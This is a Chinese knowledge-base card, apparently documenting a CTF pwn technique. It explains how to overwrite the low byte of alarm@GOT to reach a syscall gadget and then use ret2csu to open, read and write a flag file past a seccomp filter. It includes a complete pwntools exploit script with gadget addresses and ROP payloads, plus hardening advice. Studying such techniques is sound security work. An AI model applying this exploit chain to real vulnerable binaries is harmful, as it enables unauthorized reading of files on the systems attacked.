---
id: binary-pwn-rop-alarm-got-syscall-ret2csu-orw
title: 无 libc 泄露的 seccomp ORW：单字节改写 alarm@GOT 指向 alarm+9 的 syscall，ret2csu 设 rdx 调 open/read/write
type: scenario
domain: binary
path: binary/pwn/rop
technique: alarm-got-low-byte-syscall-ret2csu-orw
tags:
- pwn
- rop
- ret2csu
- got-overwrite
- partial-relro
- seccomp
- orw
- no-libc-leak
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-07T23:21:45+08:00'
  notes: 已对照原文与全部5张图核对：seccomp-tools dump 仅 KILL execve（图01）、alarm@GOT=...7d90 且 alarm+9 为 syscall（原文 pwndbg）、ROPgadget 0x401308 pop rax / 0x4014a1 pop rsi;pop r15 / 0x4014a3 pop rdi（图03）、CSU 0x40149A pop6+0x401480 mov rdx,r14;mov rsi,r13;mov edi,r12d;call [r15+rbx*8]（图04）、Partial RELRO/No PIE 描述与原文 checksec/IDA 一致；卡内 payload 结构（0x48 偏移、pop_rsi_r15→alarm@GOT→read 写 1 字节 0x99、pop rax 设 2/0/1、CSU 三连调用、0x38 填充）与原文 exp 一致。已修正 PoC 措辞：注明是按原文重组的片段，并准确描述原文先写 ./flag 再改 GOT 的顺序。单卡单一原子（alarm GOT 单字节改 syscall + ret2csu ORW 一条链）。未验证点：未复跑 exp，原文无该题 flag 成功截图（confidence 保持 medium）；无组件版本，未设 affected_versions；frontmatter 无 sources/source_url。dedup 仅自身草稿命中，其余为 related 不同链；dup-scan 无本卡 pair。
url: /docs/binary/pwn/rop/binary-pwn-rop-alarm-got-syscall-ret2csu-orw/
draft: false
kb_aliases:
- alarm GOT 改 syscall
- 单字节 GOT 覆写 syscall
- ret2csu ORW
- 无 libc 泄露 ORW
- Partial RELRO alarm
- seccomp open read write
---

## 一句话结论

在 Partial RELRO、非 PIE、没有 `puts/printf` 等 libc 泄露原语、且 seccomp 只禁 `execve` 的栈溢出题中，可先溢出调用 `read(0, alarm@GOT, n)`，只改写 `alarm@GOT` 的最低字节，使其指向 libc `alarm()` 函数体内的 `syscall; ret`（原文 libc 中为 `alarm+9`）；随后用 ret2csu 设置 `rax/rdi/rsi/rdx` 并 `call alarm@GOT`，依次执行 `open("./flag")`、`read(fd,buf,n)`、`write(1,buf,n)` 读出 flag，全程不需要泄露 libc 基址。

## 原理

- **保护与限制**：目标为 Partial RELRO、No PIE、NX（栈不可执行）；GOT 可写，但程序没有 `puts` 等输出函数可用于泄露 libc；seccomp 仅对 `execve` 返回 KILL，`open/read/write` 仍放行，因此目标是 ORW 而不是 getshell。
- **单字节 GOT 覆写的可行性**：`alarm@GOT` 中保存的是 libc 中 `alarm()` 的运行时地址。x86-64 下 `alarm()` 的实现形如 `endbr64; mov eax,0x25; syscall; cmp rax,...; ret`，`syscall` 指令位于函数入口 +9 处（原文 libc 中 `alarm=...7d90`，`syscall=...7d99`）。由于 ASLR 只随机化页内偏移以上的高位，`alarm` 与 `alarm+9` 的低 12 位固定，且通常落在同一个 256 字节页内；因此只改写 GOT 的最低字节（`0x90 → 0x99`）即可把 `alarm@GOT` 变成一个 `syscall; ret` gadget，而不需要知道 libc 基址。
- **写入方式**：先溢出到 `pop rsi; pop r15; ret`，令 `rsi=alarm@GOT`，返回到 `read@plt`；此时 `rdi` 仍为 0（stdin）、`rdx` 保留一个足够大的值，`read` 会把用户发来的 1 个字节写到 GOT。只发 1 个字节（`send` 而不是 `sendline`），避免换行符破坏高一位。
- **ret2csu 设置参数**：目标没有 `pop rdx` gadget，但有 __libc_csu_init 的通用 gadget：`pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`（0x40149A）与 `mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]; add rbx,1; cmp rbp,rbx; jnz ...; add rsp,8; pop...; ret`（0x401480）。把 `r15` 指向 `alarm@GOT`、`rbx=0`、`rbp=1`，让 call 目标为已改写的 syscall gadget；`r12/r13/r14` 分别控制 `rdi/rsi/rdx`，返回值（syscall 号）由 `pop rax; ret` 设置。
- **syscall 调用约定**：`rax=2` → open(path,flags)；`rax=0` → read(fd,buf,count)；`rax=1` → write(fd,buf,count)。每次 `call [r15]` 后 CSU 的收尾会 `add rsp,8` 再 pop 6 个寄存器，需要 `b'a'*0x38` 填充吸收。
- **为什么能绕 seccomp**：seccomp 只按系统调用号拦截 `execve`（0x3b），而 `open/read/write` 的号（2/0/1）不在拦截规则中；用 libc 里的 `syscall` 指令直接发起调用即可，不需要 libc 函数地址。

## 触发条件

- 非 PIE 可执行文件存在栈溢出，且 Partial RELRO（GOT 可写）。
- 程序没有可用的 libc 泄露原语（无 `puts/printf` 输出、无任意读），无法计算 libc 基址。
- 导入了 `alarm`（或其它函数体内含 `syscall; ret` 的 libc 函数）且其 GOT 项可写；目标 libc 的 `alarm+9` 为 `syscall; ret`，且与 `alarm` 入口在同一 256 字节页内（低字节可单字节改）。
- seccomp 只禁用 `execve/execveat`，`open/read/write` 允许（用 `seccomp-tools dump` 确认）。
- 二进制中存在 `pop rax; ret`、`pop rsi; pop r15; ret` 与 CSU gadget（`pop6` + `call`）。

## 利用步骤

1. `seccomp-tools dump ./pwn` 确认仅 `execve` 被 KILL；`checksec` 确认 Partial RELRO、非 PIE、NX。
2. 在 libc 中反汇编 `alarm`，确认 `syscall; ret` 位于 `alarm+9`，记录入口低字节（如 0x90）与 syscall 低字节（如 0x99）。
3. 第一次溢出：`payload = b'a'*offset + p64(pop_rsi_r15) + p64(alarm_got) + p64(0) + p64(read_plt) + p64(vuln)`；发送后 `send(b'\x99')`（只发 1 字节），把 `alarm@GOT` 改成 syscall gadget。
4. 第二次溢出：先用 `read` 把 `"./flag\x00"` 写到 BSS；再用 `pop rax` + ret2csu 调用：
   - `rax=2`，`rdi=BSS`，`rsi=0`，`rdx=0` → `open("./flag",0)`，返回 fd；
   - `rax=0`，`rdi=3`，`rsi=BSS+0x100`，`rdx=0x50` → `read(fd,buf,0x50)`；
   - `rax=1`，`rdi=1`，`rsi=BSS+0x100`，`rdx=0x50` → `write(1,buf,0x50)`。
5. 接收输出得到 flag；若 open 失败，检查路径、BSS 是否可写、fd 是否仍为 3。
6. 若单字节覆写不成立（`alarm+9` 跨页或低字节相同），换用其它含 `syscall` 的导入函数，或改用 SROP/mprotect+shellcode。

## PoC

按原文 exp 重组的片段（地址按目标替换，未在本机执行）：

```python
from pwn import *
context(os='linux', arch='amd64')
io = process('./pwn'); elf = ELF('./pwn')

read      = elf.plt['read']
alarm_got = elf.got['alarm']
pop_rdi   = 0x4014a3
pop_rsi_r15 = 0x4014a1
pop_rax   = 0x401308
csu_pop6  = 0x40149A
csu_call  = 0x401480
vuln      = 0x40130D
bss       = elf.bss(0x100)

# 1) 把 alarm@GOT 最低字节改为 0x99 -> alarm+9 (syscall; ret)
payload1 = b'a'*0x48 + p64(pop_rsi_r15) + p64(alarm_got) + p64(0) + p64(read) + p64(vuln)
io.sendline(payload1)
sleep(0.5)
io.send(b'\x99')          # 只发 1 字节，不能用 sendline

# 2) 写 "./flag" 到 BSS
payload2 = b'a'*0x48 + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read) + p64(vuln)
io.sendline(payload2)
sleep(0.5)
io.sendline(b'./flag\x00\x00')

# 3) ORW：open -> read -> write，全部经 alarm@GOT 的 syscall 指令
payload3  = b'a'*0x48 + p64(pop_rsi_r15) + p64(alarm_got) + p64(0) + p64(read)
payload3 += p64(pop_rax) + p64(2)
payload3 += p64(csu_pop6) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(alarm_got) + p64(csu_call)
payload3 += b'a'*0x38
payload3 += p64(pop_rax) + p64(0)
payload3 += p64(csu_pop6) + p64(0) + p64(1) + p64(3) + p64(bss+0x100) + p64(0x50) + p64(alarm_got) + p64(csu_call)
payload3 += b'a'*0x38
payload3 += p64(pop_rax) + p64(1)
payload3 += p64(csu_pop6) + p64(0) + p64(1) + p64(1) + p64(bss+0x100) + p64(0x50) + p64(alarm_got) + p64(csu_call)
io.sendline(payload3)
io.send(b'\x99')          # 与原文一致：payload3 头部的 read 会把该字节重新写入 GOT
io.interactive()
```

说明：原文 exp 先用 `read@plt` 把 `./flag` 写入 BSS、再把 `alarm@GOT` 低字节改为 `0x99`；本片段第 1 段提前完成同一 GOT 改写，第 3 段头部保留原文载荷中的内联 read 改 GOT 步骤（重复写入同一字节，不影响链）。不同 libc 的 `alarm` 入口低字节与 `syscall` 偏移需先用 `objdump -d libc.so.6` 确认。

## 变体与关联

- 目标函数变体：任何导入的 libc 函数若函数体内有 `syscall; ret` 且与入口同页，都可作为单字节 GOT 改写目标；`alarm` 因实现短小常见。
- 参数变体：有 `pop rdx` gadget 时可直接 ROP，无需 CSU；CSU 的 `mov edi,r12d` 会把 rdi 截断为 32 位，非 PIE 的低地址 BSS 可用。
- 无 GOT 可写：Full RELRO 下改用 magic gadget/BSS 任意写（另一张卡）或先泄露 libc。
- 关联：seccomp 禁 execve 的 ORW 通用链、ret2csu 基础、单字节 GOT 覆写、侧信道无输出爆破；本卡区别在于用 `alarm+9` 的 `syscall` 指令替代不可泄露的 libc 函数地址。
- 边界：单字节覆写依赖目标 libc 版本与页内布局，原文未给出该题 flag 成功截图，confidence 定为 medium；跨页或低字节相同则需换目标函数。

## 检测与防御

- CTF/利用：拿到 pwn 先 `seccomp-tools dump` + `checksec`；无 libc 泄露且 Partial RELRO 时，检查导入函数中的 `syscall; ret` 与 GOT 单字节改写可行性。
- 加固：编译时使用 Full RELRO + PIE，减少可写 GOT 与固定 gadget；seccomp 除 `execve` 外还应限制 `open/openat`（只允许读已打开的 flag fd），从根本上封堵 ORW。
- 检测（防守方）：监控进程在运行时改写自身 GOT（尤其指向 libc 代码段中间）、异常 `syscall` 序列（open/read/write 连续调用）与栈上 ROP 链；但 CTF 环境属正常解题行为。
- 边界：该手法只适用于可反复触发溢出、GOT 可写且 libc 布局满足单字节条件的二进制；有 ASLR 但页内偏移固定是关键前提。
